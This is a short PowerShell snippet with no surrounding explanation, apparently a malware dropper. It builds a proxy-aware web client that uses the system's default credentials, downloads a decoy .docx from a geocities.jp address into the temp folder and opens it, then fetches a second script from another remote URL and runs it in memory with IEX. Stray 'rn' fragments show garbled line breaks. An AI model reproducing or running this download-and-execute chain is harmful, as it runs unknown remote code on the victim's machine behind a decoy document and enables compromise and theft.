$n=new-object net.webclient;rn$n.proxy=[Net.WebRequest]::GetSystemWebProxy();rn$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;rn$n.DownloadFile("http://www.geocities.jp/lgxpoy6/zaavar.docx","$env:tempzaavar.docx");rnStart-Process "$env:tempzaavar.docx"rnIEX $n.downloadstring('http://www.geocities.jp/frgrjxq1/f0921.ps1');